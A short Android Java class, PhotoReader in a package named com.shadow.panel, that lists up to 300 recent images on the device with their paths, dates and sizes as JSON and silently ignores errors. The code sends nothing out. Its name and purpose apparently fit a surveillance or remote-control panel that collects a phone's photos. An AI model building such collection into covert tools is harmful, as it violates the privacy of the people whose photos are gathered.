package com.shadow.panel;
import android.content.Context;
import android.database.Cursor;
import android.provider.MediaStore;
import org.json.JSONArray;
import org.json.JSONObject;
public class PhotoReader {
    public static JSONArray list(Context ctx) {
        JSONArray arr = new JSONArray();
        try (Cursor c = ctx.getContentResolver().query(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, new String[]{MediaStore.Images.Media.DATA, MediaStore.Images.Media.DATE_ADDED, MediaStore.Images.Media.SIZE}, null, null, MediaStore.Images.Media.DATE_ADDED + " DESC LIMIT 300")) {
            if (c == null) return arr;
            while (c.moveToNext()) {
                JSONObject o = new JSONObject();
                o.put("path", c.getString(0));
                o.put("date", c.getLong(1));
                o.put("size", c.getLong(2));
                arr.put(o);
            }
        } catch (Exception ignored) {}
        return arr;
    }
}
